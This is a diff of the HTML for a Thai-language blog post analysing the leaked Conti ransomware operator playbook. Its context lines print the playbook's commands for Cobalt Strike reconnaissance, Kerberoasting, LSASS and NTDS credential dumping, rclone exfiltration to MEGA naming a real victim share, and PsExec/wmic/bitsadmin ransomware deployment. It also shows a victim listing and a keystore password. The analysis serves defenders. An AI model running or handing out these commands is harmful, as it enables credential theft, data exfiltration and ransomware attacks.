@@ -60,9 +60,10 @@
 <meta property="og:title" content="Conti Leak Analysis" />
 <meta property="og:description" content="วิเคราะห์การเปิดเผยคู่มือสำหรับผู้ปฏิบัติการของกลุ่มมัลแวร์เรียกค่าไถ่ Conti ศึกษาขั้นตอน เทคนิคและพฤติกรรมในการเจาะระบบตั้งแต่เข้าถึงจนถึงติดตั้งมัลแวร์เพื่อเรียกค่าไถ่" />
 <meta property="og:type" content="article" />
-<meta property="og:url" content="https://pandora.sh/posts/conti-leak-analysis/" />
+<meta property="og:url" content="https://pandora.sh/posts/conti-leak-analysis/" /><meta property="article:section" content="posts" />
 <meta property="article:published_time" content="2021-08-22T00:19:36+07:00" />
 <meta property="article:modified_time" content="2021-08-22T00:19:36+07:00" /><meta property="og:site_name" content="Pandora&#39;s Box" />
+
 
 
 
@@ -522,14 +523,14 @@
 <p>ในส่วนของการค้นหาข้อมูลภายในระบบ ผู้ปฏิบัติการจะทำการค้นหาชื่อบัญชีผู้ใช้ปัจจุบัน, กลุ่มของผู้ใช้งาน, รายการบัญชีผู้ใช้งานที่มีสิทธิ์เป็นผู้ดูแลระบบ, รายการบัญชีผู้ใช้งานในกลุ่ม domain admins และ enterprise admins, ข้อมูลของระบบ domain controller และจำนวนระบบในโดเมน การเก็บข้อมูลเกิดขึ้นผ่าน Cobalt Strike โดยใช้คำสั่ง <code>net</code></p>
 <p>หลังจากนั้นผู้ปฏิบัติการจะทำการเก็บข้อมูลของการใช้ฟีเจอร์ File sharing ผลลัพธ์ในส่วนนี้จะได้รายการของไฟล์ที่สามารถเข้าถึงได้ผ่านฟีเจอร์ด้วย เป้าหมายในขั้นตอนนี้คือการหา <code>ADMIN$</code> และพาธในฟีเจอร์ File sharing ที่บัญชีผู้ใช้งานปัจจุบันสามารถเข้าถึงได้ การเก็บข้อมูลจะมีการใช้สคริปต์ <a href="https://powersploit.readthedocs.io/en/stable/Recon/README/">Invoke-ShareFinder.ps1</a> ร่วมกับคำสั่ง <code>powershell-import</code>  และ <code>psinject</code> ของ Cobalt Strike</p>
 <p>คำสั่ง <code>psinject</code> เป็นฟีเจอร์ของ Cobalt Strike ในการแทรก DLL ของ PowerShell แบบ unmanaged ไปไว้ในโปรเซสอื่นเพื่อให้สามารถเรียกใช้คำสั่ง PowerShell ในโปรเซสดังกล่าวได้ Conti ใช้ฟีเจอร์บ่อยครั้งเมื่อมีการใช้งานสคริปต์ PowerShell ในปฏิบัติการ ตัวอย่างการเรียกใช้ในกรณีของ Conti มีตามรายละเอียดด้านล่าง  ผู้ปฏิบัติการจะมองพาธของข้อมูลที่เกี่ยวข้องกับธุรกิจของเหยื่อเพื่อนำข้อมูลออกในขั้นตอนต่อไป</p>
-<pre><code>powershell-import /home/user/work/Invoke-ShareFinder.ps1
+<pre tabindex="0"><code>powershell-import /home/user/work/Invoke-ShareFinder.ps1
 psinject 1234 x64 Invoke-ShareFinder -CheckAdmin -Verbose | Out-File -Encoding ascii C:\ProgramData\sh.txt
 psinject 5209 x64 Invoke-ShareFinder -CheckShareAccess -Verbose | Out-File -Encoding ascii C:\ProgramData\shda.txt
 </code></pre><p>ต่อมาผู้ปฏิบัติการจะเริ่มทำการเก็บข้อมูลสำหรับใช้ในการยืนยันตัวตนเพื่อยกระดับสิทธิ์ แนวทางในขั้นตอนนี้มีหลากหลายตามรายการดังนี้</p>
 <ul>
 <li>ใช้เทคนิค Kerberoast กระบวนนี้มีทางเลือกของเครื่องมืออยู่ 2 แบบ คือการใช้สคริปต์ <a href="https://powersploit.readthedocs.io/en/latest/Recon/Invoke-Kerberoast/">Invoke-Kerberoast.ps1</a> ผ่าน <code>powershell-import</code> และ <code>psinject</code> หรือการใช้ <a href="https://github.com/GhostPack/Rubeus">Rubeus</a> ผ่านคำสั่ง <code>execute-assembly</code> จากนั้นนำค่าแฮชตามไฟล์ที่ระบุในพารามิเตอร์ <code>Out-File</code> หรือ <code>outfile</code> ออกมาเพื่อทำการแคร็กในภายหลัง</li>
 </ul>
-<pre><code>// Method 1
+<pre tabindex="0"><code>// Method 1
 powershell-import /home/user/work/Invoke-Kerberoast.ps1
 psinject 4728 x64 Invoke-Kerberoast -OutputFormat HashCat | fl | Out-File -FilePath C:\ProgramData\pshashes.txt -append -force -Encoding UTF8
 
@@ -546,7 +547,7 @@ execute-assembly /home/user/work/Rubeus.exe asreproast /format:hashcat /outfile:
 <li>ใช้โปรแกรม RouterScan เพื่อ brute force ทางเครือข่าย</li>
 <li>ใช้ <a href="https://github.com/Shellntel/scripts/blob/master/Invoke-SMBAutoBrute.ps1">Invoke-SMBAutoBrute.ps1</a> เพื่อ brute force ระบบเป้าหมายผ่านโปรโตคอล SMB</li>
 </ul>
-<pre><code>// Method 1: via rundll32
+<pre tabindex="0"><code>// Method 1: via rundll32
 shell rundll32.exe C:\Windows\System32\comsvcs.dll,MiniDump &lt;PID&gt; C:\ProgramData\lsass.dmp full
 
 // Method 2: via wmic
@@ -564,7 +565,7 @@ remote-exec psexec &lt;target&gt; cmd /c rundll32.exe C:\Windows\System32\comsvc
 </li>
 <li>ทำสำเนาไฟล์ NTDS ออกมา จุดน่าสนใจในส่วนนี้คือเทคนิคที่ใช้ในการสร้างสำเนาไฟล์ คู่มือของ Conti ระบุให้ใช้ฟีเจอร์ Volume Shadow Copies ในการสร้างสำเนาจากนั้นทำการคัดลอกสำเนาจากพาธของ Volume Shadow Copies ออกมา <strong>เทคนิคนี้เป็นเทคนิคเดียวกันกับช่องโหว่ HiveNightmare หรือ SeriousSAM ซึ่งพึ่งถูกเปิดเผยเมื่อต้นเดือนสิงหาคม 2021</strong></li>
 </ul>
-<pre><code>// Step 1: Create a shadow copy
+<pre tabindex="0"><code>// Step 1: Create a shadow copy
 shell wmic /node:&quot;DC01&quot; /user:&quot;DOMAIN\admin&quot; /password:&quot;cleartextpass&quot; process call create &quot;cmd /c vssadmin create shadow /for=C:\ 2&gt;&amp;1&quot;
 
 // Step 2: Copy the shadow copy out
@@ -585,14 +586,14 @@ shell wmic /node:&quot;DC01&quot; /user:&quot;DOMAIN\admin&quot; /password:&quot
 <li>สร้างไฟล์การตั้งค่าสำหรับโปรแกรม <a href="https://rclone.org/">rclone</a> เพื่อให้สามารถอัปโหลดข้อมูลไปยังบริการ MEGA ได้</li>
 <li>เริ่มทำการอัปโหลดโดยใช้โปรแกรม rclone ตัวอย่างคำสั่งที่ใช้ในการอัปโหลดตามตัวอย่างด้านล่าง (มีการแนะนำให้อ่านคู่มือของ rclone เพื่อเรียนรู้พารามิเตอร์อื่น ๆ ที่อาจใช้เพื่อประสิทธิภาพในการอัปโหลดไฟล์)</li>
 </ol>
-<pre><code>shell rclone.exe copy &quot;\\WTFINANCE.washoetribe.net\E$\FINANCE&quot; mega:1 -q --ignore-existing --auto-confirm --multi-thread-streams 1 --transfers 3 --bwlimit 5M
+<pre tabindex="0"><code>shell rclone.exe copy &quot;\\WTFINANCE.washoetribe.net\E$\FINANCE&quot; mega:1 -q --ignore-existing --auto-confirm --multi-thread-streams 1 --transfers 3 --bwlimit 5M
 </code></pre><ol>
 <li>ในกรณีของการนำไฟล์ออกจากเซิร์ฟเวอร์แบบแยกเดี่ยว คู่มือมีการแนะนำให้ติดตั้งโปรแกรม MEGA Sync ของบริการ MEGA เพื่อทำการอัปโหลดข้อมูลเช่นเดียวกัน</li>
 <li>สร้างชุดข้อมูลสำหรับการข่มขู่โดยเน้นไปที่การหาข้อมูลบัญชีหรือประวัติการทำธุรกรรมย้อนหลัง เน้นไปที่ข้อมูลที่มีคีย์เวิร์ด อาทิ cyber, policy, insurance, endorsement, supplementary, underwriting, terms, bank, 2020, 2021 และ Statement จากนั้นทำสำเนาข้อมูลเหล่านี้พร้อมรายการแยกออกมาจากข้อมูลที่มีอยู่ใน MEGA</li>
 </ol>
 <h3 id="413-deploying-locker">4.1.3 Deploying Locker</h3>
 <p>ในส่วนสุดท้ายที่ปรากฎในชุดข้อมูล ผู้ปฏิบัติการจะได้รับคำสั่งให้เตรียมพร้อมเพื่อการติดตั้งและเริ่มการทำงานมัลแวร์เรียกค่าไถ่ ขั้นตอนในส่วนนี้จะเริ่มต้นโดยการใช้ระบบซึ่งทำหน้าที่เป็น domain controller เป็นจุดในการกระจายไฟล์โปรแกรมของมัลแวร์เรียกค่าไถ่ไปยังระบบที่อยู่ในโดเมนเดียวกัน ช่องทางของการแพร่กระจายไฟล์โปรแกรมนั้นเกิดขึ้นผ่านโปรโตคอล SMB และการใช้ฟีเจอร์ Background Intelligent Transfer Service (BITS) เข้ามาช่วย คู่มือระบุให้ทำการสร้างไฟล์สคริปต์เพื่อดำเนินการในขั้นตอนนี้โดยให้แยกตามลักษณะของโปรโตคอลหรือฟังก์ชันที่ใช้ ตามตัวอย่างด้านล่าง</p>
-<pre><code>// Copying ransomware payload across the entire domain
+<pre tabindex="0"><code>// Copying ransomware payload across the entire domain
 start PsExec.exe /accepteula @C:\share$\comps1.txt -u DOMAIN\ADMINISTRATOR -p PASSWORD cmd /c COPY &quot;\\PRIMARY_DOMAIN_CONTROLLER\share$\fx166.exe&quot; &quot;C:\windows\temp\ &quot;
 
 // Executing ransomware payload across the entire domain
@@ -602,7 +603,7 @@ start PsExec.exe -d @C:\share$\comps1.txt -u DOMAIN\ADMINISTRATOR -p PASSWORD cm
 start wmic /node:@C:\share$\comps1.txt /user:&quot;DOMAIN \Administrator&quot; /password:&quot;PASSWORD&quot; process call create &quot;cmd.exe /c bitsadmin /transfer fx166 \\DOMAIN_CONTROLLER\share$\fx166.exe %APPDATA%\fx166.exe &amp; %APPDATA%\fx166.exe &quot;
 </code></pre><p>นอกเหนือจากการกระจายและเอ็กซีคิวต์โปรแกรมของมัลแวร์เรียกค่าไถ่ คู่มือยังระบุถึงการปิดการทำงานของโปรแกรมป้องกันมัลแวร์ในระบบด้วย (น่าจะบอกก่อนที่จะปล่อย)</p>
 <p>สุดท้ายเมื่อโปรแกรมของมัลแวร์เรียกค่าไถ่ทำงานเสร็จสิ้น ผู้ปฏิบัติการจะต้องจัดเตรียมรายการปฏิบัติการตามตัวอย่างด้านล่าง</p>
-<pre><code>Example:
+<pre tabindex="0"><code>Example:
 ===============================================================
 https://www.zoominfo.com/c/labranche-therrien-daoust-lefrancois/414493394
 Website: ltdl.ca
@@ -629,7 +630,7 @@ i0KrUPg8RSrFuPPr16C931X2rS04c4892ZR1fNVfhmrmVXtOlxYisSzBJHvksbzI
 <li>การมีอยู่ของไฟล์ <code>BaseArtifactUtils.class</code> และ <code>ListenerConfig.class</code> ซึ่งไม่มีในสำเนาเถื่อนแบบอื่น ไฟล์ <code>BaseArtifactUtils.class</code> เกี่ยวข้องการปรับแต่งและตั้งค่า payload ของ Cobalt Strike ส่วนไฟล์ <code>ListenerConfig.class</code> เกี่ยวกับการปรับแต่งการตั้งค่าของ listener</li>
 <li>การมีอยู่ของไฟล์ <code>cobaltstrike.store</code> ซึ่งแสดงให้เห็นว่าเคยมีการสร้าง certificate สำหรับ TeamServer มาก่อนแล้ว keystore ใช้รหัสผ่าน <code>sUp3r@dm1n</code> ซึ่งเป็นรหัสผ่านเดียวกันกับสำเนาเถื่อนของ Cobalt Strike 4.3 และมีรายการของ private key อยู่เพียงรายการเดียว</li>
 </ul>
-<pre><code>Keystore type: PKCS12
+<pre tabindex="0"><code>Keystore type: PKCS12
 Keystore provider: SUN
 
 Your keystore contains 1 entry
